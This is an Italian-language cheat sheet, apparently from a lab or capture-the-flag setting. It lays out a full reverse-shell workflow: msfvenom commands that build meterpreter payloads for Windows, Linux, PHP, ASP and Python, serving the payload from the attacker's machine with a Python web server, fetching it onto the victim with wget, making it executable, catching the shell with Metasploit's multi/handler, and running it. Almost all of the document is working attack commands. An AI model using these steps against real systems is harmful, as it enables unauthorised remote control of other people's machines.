### Creazione payload

- Windows: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f exe > rev_shell.exe**
- Linux**: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**
- PHP: **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.php**
- ASP: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f asp > rev_shell.asp**
- Python: **msfvenom -p cmd/meterpreter/reverse_python LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.py**

### Creazione server condivisione file Python

- **python3 -m http.server 9000** creazione python web server per trasferire la shell

![image](https://github.com/user-attachments/assets/a8c8bb47-c71e-4f0b-b30c-3cf05d7b1f4a)

### Accesso con credenziali ssh

- **ssh username@targetIP**
    - inserire password

### Caricamento del payload sulla macchina vittima

- **wget http://MIO_IP:porta/FILE_SHELL**
- **chmod +x FILE_SHELL** Cambio di permessi sul payload

![image](https://github.com/user-attachments/assets/9f947c94-93d1-4442-b715-f555c3cc3677)

### MSFCONSOLE

- **use exploit/multi/handler** è il modulo in ascolto sulla macchina attaccante per funzionare come handler (per catturare la shell).
    - set lhost, lport and run

### RUN THE SHELL

- **./rev_shell.elf**  avviarlo nella sessione della vittima


